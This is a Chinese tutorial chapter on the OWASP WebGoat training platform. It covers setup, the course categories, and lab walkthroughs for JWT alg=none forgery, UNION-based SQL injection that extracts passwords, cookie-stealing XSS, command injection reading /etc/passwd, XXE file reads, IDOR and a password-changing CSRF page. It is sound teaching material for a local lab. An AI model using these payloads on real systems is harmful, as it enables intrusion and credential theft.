# 靶场5：WebGoat — OWASP 官方 Web 安全教学平台

> **难度等级**：🟡 中等
> **预计学习时间**：150 分钟
> **学习目标**：
> - 了解 WebGoat 的架构与课程体系
> - 掌握 WebGoat 的 Docker 部署方法
> - 系统学习 OWASP Top 10 各类漏洞的原理与利用
> - 能够独立完成至少 5 个核心课程的通关
> - 建立 Web 安全漏洞的系统化思维

---

## 一、WebGoat 介绍

### 1.1 什么是 WebGoat

WebGoat 是 **OWASP（开放式 Web 应用程序安全项目）** 官方出品的一款 Web 安全教学平台，它的名字来源于"Web 山羊"，寓意是一只"替罪羊"——专门用来被攻击的 Web 应用程序。

> 💡 **大白话说WebGoat——安全界的"教科书+实验课"**
>
> 如果DVWA是"新手村"，那WebGoat就是"大学课堂"。最大的区别：
> - DVWA：给你漏洞场景，自己摸索怎么打
> - **WebGoat**：先给你讲理论（为什么要这么打），再给你做实验（你试试看），**先教后用**
>
> 每条课程都有**原理讲解 + 动手实验 + 提示系统**，就像有个老师在旁边教你。
> 而且它是OWASP官方维护的——就是那个制定Web安全Top 10的国际组织——权威性拉满。
>
> WebGoat对初学者的特别价值：**它是唯一一个把"为什么"和"怎么做"一起教的靶场。** 如果你打DVWA时知其然不知其所以然，来WebGoat能找到答案。

WebGoat 使用 Java 编写，基于 Spring Boot 框架，内置了大量精心设计的安全漏洞课程。每一课都包含：

- **理论讲解**：漏洞原理、攻击场景、危害说明
- **动手实验**：可以直接在页面中进行攻击尝试
- **进度追踪**：完成课程后会标记为通过
- **提示系统**：遇到困难时可以查看 Hint 提示

### 1.2 WebGoat 的特点

| 特点 | 说明 |
|------|------|
| **官方权威** | OWASP 官方维护，内容专业可靠 |
| **课程丰富** | 涵盖认证、注入、XSS、CSRF 等十大类漏洞 |
| **交互性强** | 每节课都有可操作的实验环境 |
| **循序渐进** | 从入门到进阶，难度逐步提升 |
| **跨平台** | 基于 Java，支持 Windows/Linux/macOS |
| **开源免费** | 完全开源，可自由部署和修改 |

### 1.3 适合人群

- Web 安全初学者
- 想要系统学习 OWASP Top 10 的开发者
- 准备参加 CTF 比赛的安全爱好者
- 需要进行安全培训的企业团队

---

## 二、环境搭建

### 2.1 方式一：Docker 部署（推荐）

Docker 是最简单、最快捷的部署方式，无需配置 Java 环境。

**步骤 1：拉取镜像**

```bash
docker pull webgoat/webgoat:latest
```

**步骤 2：启动容器**

```bash
docker run -d -p 8080:8080 -p 9090:9090 --name webgoat webgoat/webgoat:latest
```

参数说明：
- `-d`：后台运行
- `-p 8080:8080`：WebGoat 主服务端口
- `-p 9090:9090`：WebWolf 辅助服务端口（用于一些需要外带数据的实验）
- `--name webgoat`：容器名称

**步骤 3：访问 WebGoat**

打开浏览器访问：`http://localhost:8080/WebGoat`

首次访问需要注册一个账号（任意用户名密码均可，仅用于本地学习进度保存）。

### 2.2 方式二：Java 直接运行

如果你已经安装了 Java 17+，可以直接下载 JAR 包运行：

```bash
# 下载 WebGoat JAR 包
wget https://github.com/WebGoat/WebGoat/releases/download/v8.2.2/webgoat-server-8.2.2.jar

# 运行
java -jar webgoat-server-8.2.2.jar
```

访问地址同样是 `http://localhost:8080/WebGoat`。

### 2.3 方式三：Docker Compose 部署（含 WebWolf）

WebWolf 是 WebGoat 的配套工具，用于接收外带数据（如 XXE、SSRF 等实验）。

创建 `docker-compose.yml`：

```yaml
version: '3'
services:
  webgoat:
    image: webgoat/webgoat:latest
    ports:
      - "8080:8080"
      - "9090:9090"
    environment:
      - WEBWOLF_HOST=webwolf
      - WEBWOLF_PORT=9090
  webwolf:
    image: webgoat/webwolf:latest
    ports:
      - "9090:9090"
```

启动：

```bash
docker-compose up -d
```

---

## 三、WebGoat 界面与课程分类

### 3.1 界面介绍

登录 WebGoat 后，界面主要分为三部分：

1. **左侧导航栏**：所有课程分类列表
2. **中间内容区**：课程讲解和实验区域
3. **右侧/底部**：提示按钮、答案查看、进度显示

### 3.2 课程分类总览

WebGoat 将课程分为以下主要类别：

| 分类 | 英文名称 | 包含课程数 | 难度 |
|------|----------|-----------|------|
| 入门介绍 | Introduction | 5 | ⭐ |
| 通用知识 | General | 10 | ⭐⭐ |
| 认证漏洞 | Authentication | 15 | ⭐⭐⭐ |
| 访问控制 | Access Control | 8 | ⭐⭐⭐ |
| 跨站脚本 | Cross Site Scripting | 12 | ⭐⭐⭐ |
| 注入漏洞 | Injection | 20 | ⭐⭐⭐⭐ |
| 反序列化 | Deserialization | 5 | ⭐⭐⭐⭐ |
| 组件漏洞 | Vulnerable Components | 5 | ⭐⭐⭐ |
| 跨站请求伪造 | CSRF | 6 | ⭐⭐⭐ |
| XML 外部实体 | XXE | 5 | ⭐⭐⭐⭐ |
| 失效的访问控制 | Broken Access Control | 8 | ⭐⭐⭐ |
| 加密问题 | Cryptographic Failures | 5 | ⭐⭐⭐ |

> 💡 **大白话说WebGoat的课程——就像大学的"必修课+选修课"**
>
> WebGoat的课程体系设计得很好，不是一股脑全给你。它们按**OWASP Top 10**（最危险的10类Web安全风险）来组织：
>
> 你不需要全部做完。先搞清楚每一类对应什么问题：
> - **(A1) Broken Access Control（访问控制失效）**：你没有权限看别人的工资单，但改一下URL参数就看到了 → 这就是越权
> - **(A2) Cryptographic Failures（加密失败）**：密码用MD5存、敏感数据传输没加密 → 就像把钥匙藏在门垫下面
> - **(A3) Injection（注入）**：SQL注入、命令注入都归在这类 → 用户输入被当成代码执行了
> - **(A4) XSS（跨站脚本）**：用户输入被当成HTML/JS输出了 → 字面意思
> - **(A7) Identification Failures（认证问题）**：弱密码、没有多因素认证、会话管理有Bug
> - **(A8) Vulnerable Components（组件漏洞）**：你用的第三方库有个已知漏洞但你没升级 → Log4j就是典型案例
>
> **学习顺序建议**：先做A3(Injection)感受"注入攻击"的通感 → 然后A1(Access Control)理解权限模型 → A4(XSS) → A7(Auth) → 其余的按兴趣来。每类3-5个实验，总共2-3小时就能建立完整的Web安全认知。

---

## 四、重点课程详解

### 4.1 Introduction（入门介绍）

这是 WebGoat 的第一站，教你如何使用这个平台。

**核心内容**：
- WebGoat 平台介绍和使用方法
- HTTP 协议基础回顾
- 如何使用开发者工具（DevTools）
- 第一个简单的漏洞练习

**学习建议**：认真完成这部分，了解平台操作方式，为后续课程打好基础。

### 4.2 General（通用知识）

这一部分涵盖 Web 安全的基础知识。

#### 4.2.1 HTTP 基础

- HTTP 请求方法：GET、POST、PUT、DELETE
- HTTP 请求头：Cookie、User-Agent、Referer、X-Forwarded-For
- HTTP 响应状态码：200、302、403、404、500
- HTTPS 与 HTTP 的区别

**实操练习**：使用 Burp Suite 或浏览器开发者工具查看和修改 HTTP 请求。

#### 4.2.2 开发者工具

- Chrome DevTools 的使用
- Elements 面板：查看和修改 DOM
- Network 面板：分析请求和响应
- Console 面板：执行 JavaScript
- Application 面板：查看 Cookie、LocalStorage

#### 4.2.3 密码学基础

- 哈希算法：MD5、SHA-1、SHA-256
- 对称加密与非对称加密
- 数字签名与证书
- 常见编码：Base64、URL 编码、Hex 编码

### 4.3 Authentication（认证漏洞）

认证是 Web 应用安全的第一道防线，也是最容易出问题的地方。

#### 4.3.1 密码暴力破解

**原理**：攻击者通过尝试大量用户名和密码组合，猜测合法用户的凭据。

**WebGoat 课程**：Authentication Bypasses、Password Reset

**防护措施**：
- 限制登录失败次数
- 增加验证码
- 使用强密码策略
- 登录失败时返回统一的错误信息

#### 4.3.2 JWT（JSON Web Token）攻击

JWT 是目前最流行的跨域认证方案，但也存在多种攻击方式：

**攻击类型**：
1. **None 算法攻击**：将算法改为 `none`，绕过签名验证
2. **弱密钥爆破**：使用弱密钥时，可通过暴力破解获取密钥
3. **密钥混淆攻击**（KID 注入）：通过修改头部的 kid 参数注入恶意内容
4. **令牌泄露**：JWT 存储在不安全的位置（如 URL、日志）

**JWT 结构回顾**：

```
Header.Payload.Signature
```

- Header：算法和类型，如 `{"alg":"HS256","typ":"JWT"}`
- Payload：声明信息，如 `{"sub":"user123","role":"user"}`
- Signature：签名，确保 token 未被篡改

#### 4.3.3 OAuth 安全问题

- 重定向 URI 验证不严
- 授权码被窃取
- 状态参数（state）缺失导致 CSRF
- 权限范围（scope）设置不当

#### 4.3.4 密码重置漏洞

- 密码重置令牌可预测
- 重置链接中的用户 ID 可篡改
- 响应中泄露重置令牌

### 4.4 Access Control（访问控制）

访问控制漏洞是 OWASP Top 10 中的重要类别，主要包括水平越权和垂直越权。

#### 4.4.1 水平越权（IDOR）

**原理**：用户 A 可以访问用户 B 的资源，通常通过修改资源 ID 实现。

**示例场景**：
```
正常请求：/api/order?id=1001（查看自己的订单）
越权请求：/api/order?id=1002（查看他人的订单）
```

**WebGoat 课程**：Insecure Direct Object References

#### 4.4.2 垂直越权

**原理**：普通用户可以访问管理员才能访问的功能。

**示例场景**：
```
普通用户请求：/admin/user/list
如果后端没有校验权限，普通用户就能看到用户列表
```

#### 4.4.3 缺失功能级访问控制

**原理**：前端隐藏了某些功能按钮，但后端没有做权限校验。

**检测方法**：
- 查看页面源代码，寻找隐藏的接口
- 尝试直接访问管理路径
- 修改请求中的角色参数

### 4.5 Cross Site Scripting（XSS）

XSS 是最常见的 Web 漏洞之一，分为三种类型。

#### 4.5.1 反射型 XSS

**原理**：恶意脚本通过 URL 参数传递，服务器将其反射到页面中执行。

**攻击流程**：
1. 攻击者构造带有恶意脚本的 URL
2. 诱导受害者点击
3. 服务器将恶意代码反射到页面
4. 受害者浏览器执行恶意脚本

**示例 Payload**：
```
http://example.com/search?q=<script>alert(document.cookie)</script>
```

#### 4.5.2 存储型 XSS

**原理**：恶意脚本被存储在服务器（如数据库、文件）中，当其他用户访问页面时执行。

**危害比反射型更大**：不需要诱导用户点击特定链接，只要访问页面就会中招。

**常见场景**：
- 留言板、评论区
- 用户资料（昵称、签名）
- 文章内容
- 私信系统

#### 4.5.3 DOM 型 XSS

**原理**：漏洞完全发生在前端，JavaScript 直接将用户可控的数据插入到 DOM 中。

**常见危险函数**：
- `document.write()`
- `innerHTML`
- `outerHTML`
- `eval()`
- `setTimeout()` / `setInterval()`

**示例**：
```javascript
// 危险代码
var name = location.hash.substring(1);
document.getElementById('greeting').innerHTML = 'Hello, ' + name;
```

攻击者构造 URL：`http://example.com/#<img src=x onerror=alert(1)>`

### 4.6 Injection（注入漏洞）

注入漏洞是 OWASP Top 10 榜首，危害极大。

#### 4.6.1 SQL 注入

**原理**：攻击者在输入中插入 SQL 代码，后端未做过滤直接拼接执行。

**基本类型**：
- **数字型注入**：`id=1 OR 1=1`
- **字符型注入**：`name=' OR '1'='1`
- **报错注入**：利用数据库报错信息获取数据
- **盲注**：通过页面差异或时间延迟判断数据
- **堆叠查询**：同时执行多条 SQL 语句

**SQL 注入基本步骤**：
1. 判断注入点（单引号测试）
2. 判断字段数（ORDER BY）
3. 判断回显位置（UNION SELECT）
4. 获取数据库信息（库名、表名、列名）
5. 获取数据内容

#### 4.6.2 命令注入

**原理**：用户输入被拼接到系统命令中执行。

**常见危险函数**：
- PHP：`system()`、`exec()`、`shell_exec()`、`passthru()`
- Java：`Runtime.getRuntime().exec()`
- Python：`os.system()`、`subprocess.call()`

**Payload 示例**：
```
127.0.0.1; cat /etc/passwd
127.0.0.1 && whoami
127.0.0.1 | id
```

### 4.7 Deserialization（反序列化）

**原理**：应用程序将用户可控的序列化数据反序列化时，攻击者可以构造恶意序列化数据，执行任意代码。

**Java 反序列化**：
- 基于 `ObjectInputStream.readObject()`
- 利用 Apache Commons Collections、Groovy 等库的利用链
- ysoserial 工具生成 Payload

**危害**：远程代码执行（RCE），危害极大。

### 4.8 Vulnerable Components（组件漏洞）

**原理**：使用了存在已知漏洞的第三方组件（库、框架、插件）。

**常见问题**：
- 使用的组件版本过旧
- 不了解组件的依赖关系
- 没有及时更新安全补丁

**WebGoat 课程**：Vulnerable Components - A9

**学习要点**：
- 了解常见组件漏洞（如 Struts2、Log4j、Spring）
- 学会使用 CVE 数据库查询漏洞
- 掌握组件版本检测方法

### 4.9 CSRF（跨站请求伪造）

**原理**：攻击者诱导已登录的用户访问恶意网站，恶意网站自动发起对目标网站的请求，利用用户的登录状态执行操作。

**攻击条件**：
1. 用户已登录目标网站
2. 用户访问了攻击者的恶意页面
3. 目标网站的关键操作没有 CSRF 防护

**防御措施**：
- CSRF Token 验证
- 验证 Referer / Origin
- SameSite Cookie 属性
- 关键操作二次验证（验证码、密码）

### 4.10 XXE（XML 外部实体注入）

**原理**：XML 解析器在解析包含外部实体引用的 XML 时，可能导致文件读取、SSRF、甚至 RCE。

**Payload 示例**：
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<foo>&xxe;</foo>
```

**危害**：
- 读取任意文件
- 内网端口扫描（SSRF）
- 命令执行（特定环境下）

---

## 五、学习路线建议

### 5.1 入门阶段（30 分钟）

1. 完成 Introduction 全部课程
2. 完成 General 中的 HTTP 基础和开发者工具课程
3. 熟悉 WebGoat 界面操作

### 5.2 基础阶段（50 分钟）

1. XSS 系列课程（反射型 → 存储型 → DOM 型）
2. SQL 注入基础课程
3. CSRF 基础课程

### 5.3 进阶阶段（40 分钟）

1. Authentication 系列（JWT、OAuth）
2. Access Control 系列（IDOR、越权）
3. Injection 进阶（盲注、命令注入）

### 5.4 高级阶段（30 分钟）

1. Deserialization 反序列化
2. XXE XML 外部实体
3. Vulnerable Components 组件漏洞

---

## 六、实战案例

### 案例 1：JWT 攻击实战 —— 破解令牌提升权限

**场景**：WebGoat 的 JWT 课程中，用户登录后获得一个 JWT token，我们需要修改 token 中的角色信息，以管理员身份访问资源。

**步骤**：

1. **登录获取 Token**

在 JWT 课程页面登录，使用账号 `tom` / `password`，在 Network 面板中找到返回的 JWT token：

```
eyJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJXZWJHb2F0IFRva2VuIEJ1aWxkZXIiLCJhdWQiOiJ3ZWJnb2F0Lm9yZyIsInN1YiI6InRvbSIsImZ1bGxuYW1lIjoiVG9tIiwiYWRtaW4iOiJmYWxzZSIsImlhdCI6MTYwMDAwMDAwMH0.xxx
```

2. **解码 JWT**

使用 [jwt.io](https://jwt.io) 或在线工具解码，得到 Payload：

```json
{
  "iss": "WebGoat Token Builder",
  "aud": "webgoat.org",
  "sub": "tom",
  "fullname": "Tom",
  "admin": "false",
  "iat": 1600000000
}
```

3. **尝试 None 算法攻击**

将 Header 中的算法改为 `none`，将 `admin` 改为 `true`，然后重新编码：

Header:
```json
{"alg":"none","typ":"JWT"}
```

Payload:
```json
{
  "iss": "WebGoat Token Builder",
  "aud": "webgoat.org",
  "sub": "tom",
  "fullname": "Tom",
  "admin": "true",
  "iat": 1600000000
}
```

Base64 编码后拼接（注意签名部分留空，因为 alg=none 不需要签名）：

```
eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJpc3MiOiJXZWJHb2F0IFRva2VuIEJ1aWxkZXIiLCJhdWQiOiJ3ZWJnb2F0Lm9yZyIsInN1YiI6InRvbSIsImZ1bGxuYW1lIjoiVG9tIiwiYWRtaW4iOiJ0cnVlIiwiaWF0IjoxNjAwMDAwMDAwfQ.
```

4. **修改请求重放**

在 Burp Suite 中替换 Authorization 头中的 token，发送请求，如果服务器接受了 alg=none 的 token，就成功提升为管理员权限。

### 案例 2：SQL 注入通关 —— 从入门到 UNION 查询

**场景**：WebGoat 的 SQL Injection (advanced) 课程，需要通过 SQL 注入获取用户密码。

**步骤**：

1. **寻找注入点**

在搜索框输入单引号 `'`，如果页面报错或显示异常，说明存在注入。

2. **判断字段数**

```sql
' ORDER BY 10-- 
```

逐步增加数字，直到报错，确定字段数。假设为 5 个字段。

3. **判断回显位置**

```sql
' UNION SELECT 1,2,3,4,5-- 
```

查看页面中显示的数字，确定哪些位置可以回显数据。

4. **获取数据库名**

```sql
' UNION SELECT 1,database(),3,4,5-- 
```

假设得到数据库名为 `webgoat`。

5. **获取表名**

```sql
' UNION SELECT 1,group_concat(table_name),3,4,5 FROM information_schema.tables WHERE table_schema=database()-- 
```

6. **获取列名**

```sql
' UNION SELECT 1,group_concat(column_name),3,4,5 FROM information_schema.columns WHERE table_name='users'-- 
```

7. **获取数据**

```sql
' UNION SELECT 1,username,password,4,5 FROM users-- 
```

### 案例 3：XSS 通关 —— 三种类型全覆盖

**3.1 反射型 XSS**

在搜索框输入：
```html
<script>alert('XSS')</script>
```

如果弹窗，说明存在反射型 XSS。

**3.2 存储型 XSS**

在留言板或评论区提交：
```html
<img src=x onerror=alert(document.cookie)>
```

刷新页面后如果弹窗，说明是存储型 XSS。

**3.3 DOM 型 XSS**

分析页面 JavaScript 代码，找到用户可控数据被插入 DOM 的位置，构造：
```
http://example.com/page#<svg onload=alert(1)>
```

### 案例 4：越权漏洞利用 —— IDOR 实战

**场景**：WebGoat 的 Access Control 课程中，有一个查看员工资料的功能，通过员工 ID 获取信息。

**步骤**：

1. 登录普通用户账号，查看自己的资料：`/WebGoat/access-control/user-profile?userId=123`
2. 尝试修改 userId 为其他值，如 `userId=124`
3. 如果能看到其他员工的信息，说明存在水平越权
4. 继续尝试管理员 ID（通常是 1 或 100），看能否获取管理员信息

**进阶**：
- 遍历所有 userId，收集所有用户信息
- 尝试修改用户信息接口（PUT/POST），看能否修改他人资料

### 案例 5：CSRF 利用 —— 伪造修改密码请求

**场景**：WebGoat 的 CSRF 课程中，修改密码的接口没有 CSRF 防护。

**步骤**：

1. 分析修改密码的请求：
```http
POST /WebGoat/csrf/change-password HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Cookie: JSESSIONID=xxx

password=newpassword123
```

2. 构造恶意 HTML 页面：

```html
<html>
<body>
  <form action="http://target/WebGoat/csrf/change-password" method="POST" id="csrf-form">
    <input type="hidden" name="password" value="hacked123">
  </form>
  <script>
    document.getElementById('csrf-form').submit();
  </script>
</body>
</html>
```

3. 诱导已登录的用户访问这个页面，用户的密码就会被改为 `hacked123`。

---

## 七、练习题

### 基础题

1. **WebGoat 使用什么编程语言编写？基于什么框架？**

2. **WebGoat 启动后的默认访问端口是什么？完整的访问路径是什么？**

3. **XSS 分为哪三种类型？简述它们的区别。**

4. **SQL 注入中，UNION 查询需要满足哪两个基本条件？**

5. **CSRF 攻击的三个必要条件是什么？**

### 进阶题

6. **JWT 的 None 算法攻击原理是什么？如何防御？**

7. **什么是 IDOR？请举例说明水平越权和垂直越权的区别。**

8. **反序列化漏洞的根本原因是什么？Java 反序列化通常利用什么工具生成 Payload？**

9. **XXE 漏洞可以造成哪些危害？至少列举 3 种。**

10. **简述 DOM 型 XSS 与反射型 XSS 的本质区别，并列举 3 个可能导致 DOM XSS 的 JavaScript 函数/属性。**

---

## 八、安全提醒

> ⚠️ **重要声明**
>
> 本靶场仅用于**授权环境下的安全学习和研究**。请严格遵守以下原则：
>
> 1. **仅限本地学习**：所有实验请在本地搭建的 WebGoat 环境中进行。
> 2. **未经授权不得攻击**：不得对任何未经授权的网站或系统进行渗透测试。
> 3. **遵守法律法规**：学习过程中请遵守《网络安全法》等相关法律法规。
> 4. **学以致用**：将所学知识用于保护系统安全，而非从事非法活动。
> 5. **道德准则**：做有道德的白帽黑客，发现漏洞及时通知厂商修复。

---

*完成本章节后，你将对 Web 安全常见漏洞有系统性的认识，为后续深入学习打下坚实基础。*
